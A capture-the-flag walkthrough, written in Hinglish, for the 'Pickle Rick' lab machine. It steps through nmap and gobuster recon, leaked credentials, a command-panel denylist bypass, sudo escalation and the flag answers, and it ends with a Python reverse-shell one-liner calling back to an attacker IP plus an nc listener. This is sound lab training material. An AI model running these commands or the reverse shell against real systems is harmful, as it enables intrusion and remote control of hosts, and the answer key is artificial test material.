# 🎯 Pickle Rick: Step-by-Step Hacking Walkthrough

---

## 📌 Phase 1: Reconnaissance (Target Scan Karna)

### Step 1: Open Ports Dhoondna
Sabse pehle Target IP mila (jaise `10.10.x.x`). Terminal par Nmap scan chalaya:
```bash
nmap -sC -sV -oN scan.txt 10.10.x.x
```
- **Result:**
  - Port 22 (SSH)
  - Port 80 (HTTP Website)

---

## 📌 Phase 2: Credentials Dhoondna (Username & Password)

### Step 2: Website Source Code Check Karna
Browser me `http://10.10.x.x` khola aur `CTRL + U` daba kar Source Code check kiya.
- Bottom me comment me username mila:
  `Username: RikW33d`

### Step 3: Directory Fuzzing (`gobuster`)
Hidden pages dhoondhne ke liye Gobuster chalaya:
```bash
gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
- Pages mile: `/login.php`, `/portal.php`, `/robots.txt`.

### Step 4: `robots.txt` Se Password Dhoondna
`http://10.10.x.x/robots.txt` khola. Page par text mila:
`Wubbalubbadubdub`

- 🔑 **Credentials:** `RikW33d` : `Wubbalubbadubdub`

---

## 📌 Phase 3: Web Login & Ingredient 1 (Denylist Bypass)

### Step 5: Web Portal Me Login Karna
`http://10.10.x.x/login.php` par gaye aur login kiya. Login successful hone par `/portal.php` par Command Panel mila.

### Step 6: Command Injection Check Karna
Command Panel input me `ls -la` type karke Execute kiya:
- Files mili:
  - `Sup3r_S3cuR3_P4ssw0rd.txt`
  - `clue.txt`
  - `portal.php`

### Step 7: Denylist Filter Bypass (Ingredient 1)
`cat Sup3r_S3cuR3_P4ssw0rd.txt` chalaya toh error aaya: `Command disabled!`.
`cat` block hone par `less` command use ki:
```bash
less Sup3r_S3cuR3_P4ssw0rd.txt
```
- 🥇 **Ingredient 1:** `mr. meeseek hair`

---

## 📌 Phase 4: Ingredient 2 Dhoondna

### Step 8: Clue Read Karna
Command Panel me type kiya:
```bash
less clue.txt
```
- Output: `"Look around the file system to find the other two ingredients."`

### Step 9: Home Directory Check Karna
Linux file system check kiya:
```bash
ls -la /home/rick
```
- File mili: `second ingredient.txt`.

### Step 10: Ingredient 2 Read Karna
```bash
less "/home/rick/second ingredient.txt"
```
- 🥈 **Ingredient 2:** `1 jerry tear`

---

## 📌 Phase 5: Root Access & Ingredient 3 (Privilege Escalation)

### Step 11: Sudo Permissions Check Karna
Check kiya ki current web user (`www-data`) ke paas kya admin rights hain:
```bash
sudo -l
```
- Output: `(ALL : ALL) NOPASSWD: ALL`
- Iska matlab `www-data` bina password ke koi bhi `sudo` command chala sakta hai!

### Step 12: Root Folder Check Karna
```bash
sudo ls -la /root
```
- File mili: `3rd.txt`.

### Step 13: Ingredient 3 Read Karna
```bash
sudo less /root/3rd.txt
```
- 🥉 **Ingredient 3:** `fleeb juice`

---

## 📌 Phase 6: Full Root Interactive Shell Strategy

### Step 14: Attacker Machine Listener
Apne Kali Terminal par:
```bash
nc -lvnp 4444
```

### Step 15: Target Machine Reverse Shell
Target Command Panel par:
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Step 16: Root Become
Netcat shell milne ke baad type kiya:
```bash
sudo su
whoami
# Output: root
```
🎉 **Pickle Rick System Completely Hacked!**
